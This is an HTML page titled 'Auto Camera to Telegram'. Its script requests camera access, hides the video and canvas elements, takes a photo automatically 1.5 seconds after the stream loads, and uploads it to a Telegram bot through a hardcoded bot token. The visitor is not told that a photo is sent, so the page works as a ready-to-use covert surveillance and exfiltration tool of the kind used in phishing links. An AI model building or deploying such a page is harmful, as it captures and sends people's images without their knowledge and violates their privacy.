<!DOCTYPE html>
<html>
<head>
  <title>Auto Camera to Telegram</title>
</head>
<body>

<video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

<script>
  const BOT_TOKEN = "7537785860:AAEJYsULgBX48brbbZtRUhfTtGd2v_XZ-zg";
  const CHAT_ID = "1234"; // üëâ ·ûî·üí·ûä·ûº·ûö·ûá·û∂ chat ID ·ûö·ûî·ûü·üã·û¢·üí·ûì·ûÄ

  // Activate camera and auto capture
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.getElementById('video');
      video.srcObject = stream;

      // Wait for video to load and then capture
      video.onloadedmetadata = () => {
        setTimeout(() => {
          takePhoto();
        }, 1500); // wait 1.5 seconds before auto capture
      };
    })
    .catch(error => {
      alert("Camera access denied or error: " + error.message);
    });

  function takePhoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "photo.jpg");

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log("‚úÖ Photo sent to Telegram.");
        } else {
          console.error("‚ùå Failed to send photo:", data);
        }
      })
      .catch(error => {
        console.error("‚ùå Error sending photo:", error);
      });
    }, 'image/jpeg');
  }
</script>

</body>
</html>
